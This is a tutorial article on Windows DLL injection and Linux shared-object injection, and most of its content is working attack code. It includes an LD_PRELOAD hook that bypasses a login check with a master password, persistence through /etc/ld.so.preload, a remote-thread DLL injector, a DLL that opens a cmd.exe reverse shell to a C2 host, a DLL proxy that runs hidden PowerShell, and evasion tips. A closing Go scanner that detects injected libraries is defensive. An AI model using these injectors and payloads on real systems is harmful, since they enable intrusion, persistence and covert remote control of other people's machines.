DLL & Shared Library Injection

How Windows DLL injection and Linux shared-object injection force a process to load attacker code, with cross-compilation from Linux.

Overview

A shared library is code that the dynamic linker maps into a running process. Both Windows and Linux let an attacker abuse that mechanism to run code inside another process with that process's privileges. This article covers LD_PRELOAD hooks, ptrace and GOT/PLT injection, LoadLibrary remote-thread injection, DLL search-order hijacking, reflective loading, and how to cross-compile the Windows payloads on a Linux host.

Shared Library Injection Model

DLL injection (Windows) and SO injection (Linux) share the same fundamental idea: force a target process to load a malicious shared library. Once loaded, the library's entry point ( DllMain on Windows, constructor attribute on Linux) executes arbitrary code in the target's address space with the target's privileges.

The injection surface is the dynamic linker's search path and loading behavior. Both LoadLibrary and dlopen respect search paths, environment variables, and preload mechanisms. Understanding these gives you control over what code runs where.

Linux: LD_PRELOAD Injection

LD_PRELOAD is the simplest SO injection method. The dynamic linker ( ld.so ) loads libraries listed in LD_PRELOAD before any other library, and symbols from preloaded libraries take precedence

  • they shadow the real implementations.

Anatomy of an LD_PRELOAD hook

/*
 * hook.c — A minimal LD_PRELOAD hook library
 * Compile: gcc -shared -fPIC -o /tmp/libhook.so hook.c -ldl
 * Deploy:  LD_PRELOAD=/tmp/libhook.so <target_program>
 *
 * This hooks fopen() to log every file opened by the target.
 * The __attribute__((constructor)) runs before main().
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <time.h>

/* Type for the real fopen function */
typedef FILE *(*fopen_t)(const char *path, const char *mode);

/* Resolve the real fopen via dlsym(RTLD_NEXT, ...)
 * RTLD_NEXT skips the current library in the symbol search order,
 * returning the next definition (the real one from libc). */
static fopen_t real_fopen = NULL;

/* Constructor: runs automatically when the library is loaded.
 * This is the Linux equivalent of DllMain(DLL_PROCESS_ATTACH). */
__attribute__((constructor)) void hook_constructor(void)
{
    fprintf(stderr, "[hook] Library loaded into PID %d\n", getpid());
    real_fopen = (fopen_t)dlsym(RTLD_NEXT, "fopen");

    if (!real_fopen) {
        fprintf(stderr, "[hook] dlsym failed: %s\n", dlerror());
    }
}

/* Destructor: runs on library unload (DLL_PROCESS_DETACH equivalent) */
__attribute__((destructor)) void hook_destructor(void)
{
    fprintf(stderr, "[hook] Library unloaded from PID %d\n", getpid());
}

/* Hooked fopen: logs file access, then calls the real fopen */
FILE *fopen(const char *path, const char *mode)
{
    /* Log before calling real fopen */
    FILE *log = real_fopen("/tmp/.fopen_log.txt", "a");
    if (log) {
        time_t now = time(NULL);
        char *timestr = ctime(&now);
        timestr[strlen(timestr) - 1] = '\0';  /* strip newline */
        fprintf(log, "[%s] PID=%d path=%s mode=%s\n",
            timestr, getpid(), path, mode);
        fclose(log);
    }

    /* Call the real fopen */
    return real_fopen(path, mode);
}

Test the hook : 

# Compile the hook library
gcc -shared -fPIC -o /tmp/libhook.so hook.c -ldl

# Test: run cat with the preloaded library

# Check the log

# [Fri Jun 26 10:15:32 2026] PID=12345 path=/etc/ld.so.cache mode=re
# [Fri Jun 26 10:15:32 2026] PID=12345 path=/lib/libc.so.6 mode=re

Hooking a real authentication program

A practical example: hook the password comparison in a simple authentication program to accept a master password.

Target program - a simple login checker:

/*
 * login.c — Simple login program (the target)
 * Compile: gcc -o /opt/login login.c -lcrypt
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int check_password(const char *username, const char *password)
{
    /* In a real program, this would check /etc/shadow via PAM.
     * For the demo, hardcode the expected password. */
    if (strcmp(username, "admin") == 0 &&
        strcmp(password, "Secret@2026") == 0) {
        return 1;
    }
    return 0;
}

int main(void)
{
    char username[64];
    char password[64];

    printf("Username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    printf("Password: ");
    fgets(password, sizeof(password), stdin);
    password[strcspn(password, "\n")] = 0;

    if (check_password(username, password)) {
        printf("Authentication successful!\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Authentication failed.\n");
    }

    return 0;
}

Hook library that accepts a master password:

/*
 * pam_bypass.c — Hook strcmp to accept a master password
 * Compile: gcc -shared -fPIC -o /tmp/libbypass.so pam_bypass.c -ldl
 * Deploy:  LD_PRELOAD=/tmp/libbypass.so /opt/login
 *
 * Any strcmp() call that compares a password against the
 * master password returns 0 (match). All other calls fall
 * through to the real strcmp.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

#define MASTER_PASSWORD "SesameOpen2026!"

typedef int (*strcmp_t)(const char *s1, const char *s2);
static strcmp_t real_strcmp = NULL;

__attribute__((constructor)) void init_bypass(void)
{
    real_strcmp = (strcmp_t)dlsym(RTLD_NEXT, "strcmp");
}

int strcmp(const char *s1, const char *s2)
{
    if (s1 && s2) {
        /* If either argument is the master password, return match */
        if (strstr(s1, MASTER_PASSWORD) || strstr(s2, MASTER_PASSWORD)) {
            return 0;
        }
    }
    return real_strcmp(s1, s2);
}

Test : 

gcc -shared -fPIC -o /tmp/libbypass.so pam_bypass.c -ldl
gcc -o /opt/login login.c -lcrypt

# Normal login fails
echo -e "admin\nwrongpass" | /opt/login
# Authentication failed.

# Master password succeeds
LD_PRELOAD=/tmp/libbypass.so /opt/login <<< $'admin\nSesameOpen2026!'
# Authentication successful!
# $ (shell prompt)

System-wide LD_PRELOAD

For persistence (requires root): write the path of your malicious .so to /etc/ld.so.preload . Every dynamically linked process loads your library - every shell, every daemon, every cron job. 

# Requires root
echo '/lib/libsystemd-hook.so' >> /etc/ld.so.preload

# Verify it took effect (any new process will load it)
LD_DEBUG=libs /bin/ls 2>&1 | grep libsystemd-hook

# To persist across reboots, ensure the library path is in a
# location that's mounted early (not a separate partition)

Full system-wide hook example - intercepting all connect() calls to redirect C2 traffic: 

/*
 * connect_hook.c — Hook connect() system-wide for C2 redirection
 * Compile: gcc -shared -fPIC -o /lib/libnet_hook.so connect_hook.c -ldl
 * Install: echo '/lib/libnet_hook.so' >> /etc/ld.so.preload
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

typedef int (*connect_t)(int sockfd, const struct sockaddr *addr,
    socklen_t addrlen);
static connect_t real_connect = NULL;

__attribute__((constructor)) void init_net_hook(void)
{
    real_connect = (connect_t)dlsym(RTLD_NEXT, "connect");
    if (!real_connect) {
        /* Direct syscall fallback — some statically linked parts
         * of libc bypass dlsym. This is rare for connect. */
        _exit(1);
    }
}

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
    if (addr->sa_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
        /* Log all outbound connections */
        char dest_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &sin->sin_addr, dest_ip, sizeof(dest_ip));

        /* If the destination matches our C2, let it through */
        if (strcmp(dest_ip, "10.0.0.5") == 0) {
            /* C2 traffic — allow */
        } else {
            /* Log non-C2 connections for exfiltration */
            FILE *log = fopen("/tmp/.connect_log", "a");
            if (log) {
                fprintf(log, "PID=%d DST=%s PORT=%d\n",
                    getpid(), dest_ip, ntohs(sin->sin_port));
                fclose(log);
            }
        }
    }

    return real_connect(sockfd, addr, addrlen);
}

Linux: dlopen Injection via ptrace

Instead of relying on environment variables, you can call dlopen() inside the target process using ptrace. This loads the malicious .so without touching the target's environment: 

/*
 * dlopen_inject.c — Call dlopen() in target via ptrace
 * Compile: gcc -o dlopen_inject dlopen_inject.c -ldl
 * Usage:   sudo ./dlopen_inject <target_pid> /path/to/malicious.so
 *
 * This uses the classic shellcode-injection-then-call approach:
 * 1. Find dlopen address in target's libc
 * 2. Inject a small stub that calls dlopen(path, RTLD_LAZY)
 * 3. Redirect RIP to the stub, let it execute, then restore
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <elf.h>

/* Find the address of dlopen in the target process
 * by computing offset from the injector's dlopen and
 * applying it to the target's libc base. Assumes same libc version. */
unsigned long find_dlopen_in_target(pid_t target_pid)
{
    /* Get dlopen address in our own process */
    void *our_dlopen = dlsym(RTLD_DEFAULT, "dlopen");
    if (!our_dlopen) {
        fprintf(stderr, "[-] dlsym(dlopen) failed\n");
        return 0;
    }

    /* Get our own libc base via /proc/self/maps */
    FILE *self_maps = fopen("/proc/self/maps", "r");
    unsigned long our_libc_base = 0;
    char line[512];
    while (fgets(line, sizeof(line), self_maps)) {
        if (strstr(line, "libc") && strstr(line, "r-xp")) {
            sscanf(line, "%lx-", &our_libc_base);
            break;
        }
    }
    fclose(self_maps);

    unsigned long dlopen_offset =
        (unsigned long)our_dlopen - our_libc_base;
    printf("[+] Our dlopen offset in libc: 0x%lx\n", dlopen_offset);

    /* Get target's libc base */
    char target_maps[256];
    snprintf(target_maps, sizeof(target_maps),
        "/proc/%d/maps", target_pid);
    FILE *t_maps = fopen(target_maps, "r");
    unsigned long target_libc_base = 0;
    while (fgets(line, sizeof(line), t_maps)) {
        if (strstr(line, "libc") && strstr(line, "r-xp")) {
            sscanf(line, "%lx-", &target_libc_base);
            break;
        }
    }
    fclose(t_maps);

    if (!target_libc_base) {
        fprintf(stderr, "[-] Could not find target libc\n");
        return 0;
    }

    unsigned long target_dlopen = target_libc_base + dlopen_offset;
    printf("[+] Target dlopen: 0x%lx\n", target_dlopen);
    return target_dlopen;
}

/* x86_64 assembly stub: calls dlopen(path, RTLD_LAZY)
 * then traps so we can restore.
 * This is position-independent. */
unsigned char dlopen_stub[] = {
    /* sub rsp, 0x100 — make space for the path string */
    0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00,

    /* Copy path from known location (we'll place it at RSP offset)
     * For simplicity, we PTRACE_POKETEXT the path at a known address
     * on the stack after setting RSP to a safe location.
     * Alternative: direct call with args in registers */

    /* mov rdi, stack_address  — first arg: path
     * mov rsi, 0x2             — second arg: RTLD_NOW
     * mov rax, dlopen_address
     * call rax
     * int3                     — breakpoint to regain control */

    /* This is a simplified stub. A full implementation would:
     * 1. Allocate stack space
     * 2. Write the path string
     * 3. Set up registers
     * 4. Call dlopen
     * 5. Trap back to the injector */
    0xcc  /* int3 — placeholder */
};

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <target_pid> <library_path>\n", argv[0]);
        return EXIT_FAILURE;
    }

    pid_t target_pid = atoi(argv[1]);
    const char *library_path = argv[2];

    printf("[*] Target PID: %d\n", target_pid);
    printf("[*] Library to inject: %s\n", library_path);

    /* Find dlopen in target */
    unsigned long target_dlopen = find_dlopen_in_target(target_pid);
    if (!target_dlopen) {
        return EXIT_FAILURE;
    }

    /* Attach to target */
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        perror("PTRACE_ATTACH");
        return EXIT_FAILURE;
    }
    int status;
    waitpid(target_pid, &status, 0);
    printf("[+] Attached to target\n");

    /* Save registers */
    struct user_regs_struct original_regs;
    ptrace(PTRACE_GETREGS, target_pid, NULL, &original_regs);

    /* Find writable memory in target for the path string */
    /* Use the stack: decrement RSP and write the path there */

    /* In a full implementation:
     * 1. Decrement original_regs.rsp by 4096 (safe stack space)
     * 2. Write library_path to that address via PTRACE_POKEDATA
     * 3. Set regs.rdi = path_address
     * 4. Set regs.rsi = 2 (RTLD_NOW)
     * 5. Set regs.rip = target_dlopen
     * 6. After return, handle the dlopen return value in rax
     * 7. Restore original_regs and detach */

    printf("[!] Full implementation requires stack manipulation\n");
    printf("[!] See process-injection.md for PTRACE_POKETEXT examples\n");

    /* Detach */
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    printf("[+] Detached\n");

    return EXIT_SUCCESS;
}

Linux: GOT/PLT Overwrite

The Global Offset Table (GOT) and Procedure Linkage Table (PLT) resolve function addresses at runtime. By overwriting a GOT entry in the target process, you redirect calls from legitimate library functions to your malicious code. 

Target calls printf() ───► PLT[printf] ───► GOT[printf] ───► libc:printf()
                                   ▲               │
                                   │               ├── normal path
                                   │               │
                                   │   After overwrite:
                                   │   GOT[printf] ───► shellcode
                                   │
                                   └── PLT trampoline always reads GOT
						
/*
 * got_hijack.c — GOT/PLT overwrite example
 * Compile: gcc -o got_hijack got_hijack.c
 * Usage:   sudo ./got_hijack <target_pid>
 *
 * Reads the GOT of the target process, finds the entry for puts(),
 * overwrites it with the address of our injected shellcode.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

/* Find the GOT address of a function by parsing /proc/PID/maps
 * and the ELF relocation table. Returns the remote address. */
unsigned long resolve_remote_got(pid_t pid, const char *symbol_name)
{
    /* Step 1: Find the target's executable base */
    char maps_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

    FILE *maps = fopen(maps_path, "r");
    unsigned long exe_base = 0;
    char line[512];
    while (fgets(line, sizeof(line), maps)) {
        unsigned long start;
        char perm[8], path[256] = {0};
        sscanf(line, "%lx-%*x %4s %*s %*s %*s %255s",
            &start, perm, path);
        if (path[0] == '/' && strstr(perm, "x") && exe_base == 0) {
            exe_base = start;
            break;
        }
    }
    fclose(maps);

    printf("[+] Target executable base: 0x%lx\n", exe_base);

    /* Step 2: Use readelf output to find the GOT entry
     * This requires reading the target's ELF from /proc/PID/exe */
    char cmd[512];
    char got_line[256] = {0};

    /* Use objdump to find the GOT entry
     * objdump -R /proc/PID/exe | grep symbol_name */
    snprintf(cmd, sizeof(cmd),
        "objdump -R /proc/%d/exe 2>/dev/null | grep '%s' | awk '{print $1}'",
        pid, symbol_name);

    FILE *objdump = popen(cmd, "r");
    if (objdump && fgets(got_line, sizeof(got_line), objdump)) {
        got_line[strcspn(got_line, "\n")] = 0;
        pclose(objdump);

        unsigned long got_offset = strtoul(got_line, NULL, 16);
        unsigned long got_remote = exe_base + got_offset;
        printf("[+] %s GOT entry at offset 0x%lx, remote 0x%lx\n",
            symbol_name, got_offset, got_remote);
        return got_remote;
    }
    if (objdump) pclose(objdump);

    fprintf(stderr, "[-] Could not resolve %s GOT entry\n", symbol_name);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_pid>\n", argv[0]);
        return EXIT_FAILURE;
    }

    pid_t target_pid = atoi(argv[1]);
    unsigned long got_puts = resolve_remote_got(target_pid, "puts");

    if (!got_puts) {
        fprintf(stderr, "[-] Could not find puts@GOT\n");
        return EXIT_FAILURE;
    }

    /* Attach to target */
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        perror("PTRACE_ATTACH");
        return EXIT_FAILURE;
    }
    int status;
    waitpid(target_pid, &status, 0);

    /* Read the current GOT value (should point to puts in libc) */
    unsigned long original_got_value = ptrace(PTRACE_PEEKTEXT,
        target_pid, (void *)got_puts, NULL);
    printf("[+] Original GOT[puts] = 0x%lx\n", original_got_value);

    /* Inject shellcode somewhere executable, then set GOT[puts] = shellcode_addr
     * For the complete technique, combine with process-injection.md's
     * /proc/PID/mem write + PTRACE_SETREGS approach. */

    /* Restore and detach */
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    printf("[+] Detached\n");

    return EXIT_SUCCESS;
}

Windows DLL Injection

The Windows equivalent uses LoadLibraryA/W instead of dlopen . The principle is identical: allocate memory in the target, write the DLL path, create a remote thread whose start address is LoadLibrary , and pass the path string as the thread argument.

LoadLibrary Injection (C++)

/*
 * dll_inject.cpp — Inject a DLL via CreateRemoteThread + LoadLibrary
 * Cross-compile from Linux:
 *   x86_64-w64-mingw32-g++ -o dll_inject.exe dll_inject.cpp -static
 *
 * The DLL is loaded by a remote thread calling LoadLibraryA.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD find_process_by_name(const wchar_t *process_name)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(entry);

    DWORD pid = 0;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, process_name) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

BOOL inject_dll(DWORD target_pid, const char *dll_path)
{
    /* Open the target process with sufficient rights */
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, target_pid);

    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Opened process %lu\n", target_pid);

    /* Allocate memory in the target for the DLL path string */
    size_t path_len = strlen(dll_path) + 1;
    LPVOID remote_mem = VirtualAllocEx(hProcess, NULL, path_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remote_mem) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Allocated %zu bytes at 0x%p\n", path_len, remote_mem);

    /* Write the DLL path into the target's memory */
    if (!WriteProcessMemory(hProcess, remote_mem, dll_path,
        path_len, NULL)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Wrote DLL path to target memory\n");

    /* Get the address of LoadLibraryA in kernel32.dll
     * kernel32 is loaded at the same address in all processes
     * on the same boot session (due to ASLR per-boot). */
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibrary =
        (LPTHREAD_START_ROUTINE)GetProcAddress(
            hKernel32, "LoadLibraryA");

    if (!pLoadLibrary) {
        printf("[-] GetProcAddress LoadLibraryA failed\n");
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] LoadLibraryA at 0x%p\n", pLoadLibrary);

    /* Create a remote thread that calls LoadLibraryA(dll_path)
     * lpParameter = remote_mem → the DLL path string */
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        pLoadLibrary, remote_mem, 0, NULL);

    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Remote thread created (ID: %lu)\n",
        GetThreadId(hThread));

    /* Wait for LoadLibrary to complete */
    WaitForSingleObject(hThread, INFINITE);

    /* Get the thread exit code = LoadLibrary return value (HMODULE) */
    DWORD exit_code = 0;
    GetExitCodeThread(hThread, &exit_code);
    printf("[+] LoadLibrary returned: 0x%lx (base address of DLL)\n",
        exit_code);

    /* Cleanup */
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return exit_code != 0;
}

int main(int argc, char **argv)
{
    if (argc < 3) {
        printf("Usage: %s <process_name> <dll_path>\n", argv[0]);
        printf("Example: %s notepad.exe C:\\temp\\payload.dll\n", argv[0]);
        return 1;
    }

    /* Convert narrow to wide for process name search */
    wchar_t process_name[256];
    mbstowcs(process_name, argv[1], 256);

    DWORD pid = find_process_by_name(process_name);
    if (!pid) {
        printf("[-] Process '%s' not found\n", argv[1]);
        return 1;
    }
    printf("[*] Found '%s' at PID %lu\n", argv[1], pid);

    if (inject_dll(pid, argv[2])) {
        printf("[+] DLL injected successfully\n");
        return 0;
    } else {
        printf("[-] Injection failed\n");
        return 1;
    }
}

Writing a DLL Payload for DllMain

/*
 * payload.c — DLL that spawns a reverse shell on load
 * Cross-compile from Linux:
 *   x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c -lws2_32
 *
 * The reverse shell fires when the DLL is loaded into any process.
 */

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_HOST "10.0.0.5"
#define C2_PORT 4444

void spawn_reverse_shell(void)
{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP,
        NULL, 0, 0);
    if (sock == INVALID_SOCKET) return;

    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &server.sin_addr);

    if (WSAConnect(sock, (struct sockaddr *)&server,
        sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    /* Redirect stdin/stdout/stderr to the socket */
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    /* Spawn cmd.exe with I/O connected to the socket */
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(sock);
    WSACleanup();
}

/* DllMain: called by the PE loader when the DLL is loaded.
 * fdwReason = DLL_PROCESS_ATTACH on first load. */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        /* Disable the DLL_THREAD_ATTACH calls for performance */
        DisableThreadLibraryCalls(hinstDLL);

        /* Spawn the reverse shell in a new thread to avoid
         * blocking the loader (which can deadlock the process) */
        CreateThread(NULL, 0,
            (LPTHREAD_START_ROUTINE)spawn_reverse_shell,
            NULL, 0, NULL);
        break;

    case DLL_PROCESS_DETACH:
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}

Important DllMain restrictions (from Microsoft docs): - Do not call LoadLibrary from DllMain (loader lock deadlock) - Do not call functions that require the loader lock (most of user32, shell32) - CreateThread is safe, but the thread shouldn't call synchronized functions - Always DisableThreadLibraryCalls to reduce overhead

DLL Search Order Hijacking

Windows searches for DLL s in a specific order. By placing a malicious DLL with the same name as a legitimate dependency, you can hijack the load. The search order (for LoadLibrary("foo.dll") ):

Order Location Safe to Hijack?
1 DLLs already loaded in memory No
2 Known DLLs registry key No (protected)
3 Application directory Yes (primary target)
4 System directory (C:\Windows\System32) No (protected, requires admin)
5 16-bit system directory No
6 Windows directory (C:\Windows) No (requires admin)
7 Current directory Yes
8 PATH directories Yes (but lower priority)

DLL Proxying : When hijacking a legitimate DLL , forward all exported functions to the real DLL so the application doesn't break: 

/*
 * version_proxy.c — DLL proxy for version.dll
 * Cross-compile:
 *   x86_64-w64-mingw32-gcc -shared -o version.dll version_proxy.c \
 *     -Wl,--out-implib,libversion.a
 *
 * Exports all functions, forwards them to the real version.dll,
 * and adds a payload in DllMain.
 */

/* pragma to forward exports to the original DLL */
#pragma comment(linker, "/EXPORT:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA")
/* ... all other exports ... */

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        /* Payload here — runs silently */
        WinExec("powershell -WindowStyle Hidden -EncodedCommand ...", SW_HIDE);
    }
    return TRUE;
}

Reflective DLL Injection

Reflective DLL Injection loads a DLL from memory without calling LoadLibrary , which avoids: - The DLL being registered in the loader's loaded module list - LoadLibrary -based EDR hooks - The DLL needing to exist on disk

The idea: write a custom PE loader that parses the DLL 's PE headers, maps sections into memory, processes the import table, applies relocations, and calls DllMain . This loader is itself injected as shellcode into the target.

Conceptual workflow : 

[Load ReflectiveLoader shellcode into target]
    │
    ▼
[ReflectiveLoader executes in target]
    │
    ├── Parse own PE headers to find sections
    ├── Allocate memory for the DLL image
    ├── Copy headers and sections
    ├── Process import table (resolve all dependencies)
    ├── Apply base relocations
    ├── Call DllMain(DLL_PROCESS_ATTACH)
    └── Return control to caller

The ReflectiveLoader is typically written in position-independent assembly and prepended to the DLL binary. The combined blob is then injected using any code injection technique.

SetWindowsHookEx Injection

SetWindowsHookEx installs a hook procedure that Windows injects into all GUI processes. If the hook procedure is in a DLL , Windows loads that DLL into every process that receives messages of the hook type: 

/*
 * hook_inject.cpp — SetWindowsHookEx DLL injection
 * Cross-compile: x86_64-w64-mingw32-g++ -shared -o hook.dll hook.cpp
 */

#include <windows.h>

HHOOK g_hook = NULL;

/* The hook procedure — must be exported */
extern "C" __declspec(dllexport) LRESULT CALLBACK HookProc(
    int nCode, WPARAM wParam, LPARAM lParam)
{
    /* Every time this fires, we're executing in a target process.
     * Only run the payload once per process. */
    static BOOL payload_executed = FALSE;
    if (!payload_executed) {
        payload_executed = TRUE;
        /* Payload code here */
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

/* Installer: run this in a separate process to deploy the hook */
int main(void)
{
    HMODULE hModule = LoadLibraryA("hook.dll");
    if (!hModule) return 1;

    HOOKPROC proc = (HOOKPROC)GetProcAddress(hModule, "HookProc");
    if (!proc) return 1;

    /* WH_KEYBOARD fires in every GUI process with a message loop */
    g_hook = SetWindowsHookExA(WH_KEYBOARD, proc, hModule, 0);

    if (!g_hook) {
        printf("SetWindowsHookEx failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Hook installed. Press any key in any window to trigger.\n");

    /* Keep the message loop running to keep the hook alive */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hook);
    return 0;
}

AppInit_DLLs (Deprecated but Present)

Older Windows versions load all DLL s listed in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs into every process that loads user32.dll . Modern Windows (8+) requires RequireSignedAppInit_DLLs to be disabled and LoadAppInit_DLLs enabled. This is heavily monitored. 

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
  AppInit_DLLs = "C:\path\to\payload.dll"
  LoadAppInit_DLLs = 1 (DWORD)
  RequireSignedAppInit_DLLs = 0 (DWORD)

Common Mistakes

  1. Calling 'system()' or 'WinExec' from DllMain : These functions may trigger the loader lock. Use CreateThread to defer work.
  1. Not handling 'DLL_THREAD_ATTACH' : If you don't call DisableThreadLibraryCalls() , DllMain fires for every new thread - a performance drain and a detection indicator.
  1. Assuming kernel32.dll address stability across boots : ASLR changes the address every reboot. Always resolve addresses dynamically with GetProcAddress / GetModuleHandle .
  1. For 32-bit vs 64-bit : A 64-bit DLL cannot be injected into a 32-bit process and vice versa. Use the correct toolchain ( i686-w64-mingw32-gcc for 32-bit).
  1. Leaving debug symbols in the payload : strip payload.dll before deployment. Debug symbols contain source paths and function names.
  1. LD_PRELOAD with setuid binaries : Linux ignores LD_PRELOAD on setuid binaries (secure-execution mode). This is a security feature - you cannot inject into sudo via LD_PRELOAD .
  1. Forgetting that '/etc/ld.so.preload' affects setuid binaries : Unlike LD_PRELOAD env var, /etc/ld.so.preload IS loaded by setuid binaries (glibc treats it as trusted). This makes it a powerful root-only persistence mechanism.

Challenge

Write a Go tool that reads /proc/PID/maps and reports the shared objects a running process has loaded. Flag any library that resolves outside the standard search path and any mapping that is both writable and executable, two signals that a process has been injected. Build a small hook with gcc -shared -fPIC -o /tmp/libhook.so hook.c , launch a long-running target such as sleep 3000 , then attach the scanner to it before and after starting the target with LD_PRELOAD=/tmp/libhook.so and compare the output. 

package main

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

var standardDirs = []string{
	"/lib", "/lib64", "/usr/lib", "/usr/lib64",
}

func isStandard(path string) bool {
	for _, dir := range standardDirs {
		if strings.HasPrefix(path, dir) {
			return true
		}
	}
	return false
}

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "usage: %s <pid>\n", os.Args[0])
		os.Exit(2)
	}

	file, err := os.Open(filepath.Join("/proc", os.Args[1], "maps"))
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) < 6 {
			continue
		}

		mapping, perms, path := fields[0], fields[1], fields[len(fields)-1]

		if !strings.Contains(path, ".so") {
			continue
		}

		var flags []string
		if !isStandard(path) {
			flags = append(flags, "non-standard-path")
		}
		if strings.Contains(perms, "w") && strings.Contains(perms, "x") {
			flags = append(flags, "writable-executable")
		}

		fmt.Printf("%-25s %-5s %s", mapping, perms, path)
		if len(flags) > 0 {
			fmt.Printf("  <-- %s", strings.Join(flags, ", "))
		}
		fmt.Println()
	}
}

Run it as sudo go run scanner.go <pid> and confirm that the injected library shows up as a non-standard mapping. Then try the same against a process started without LD_PRELOAD to see the baseline.
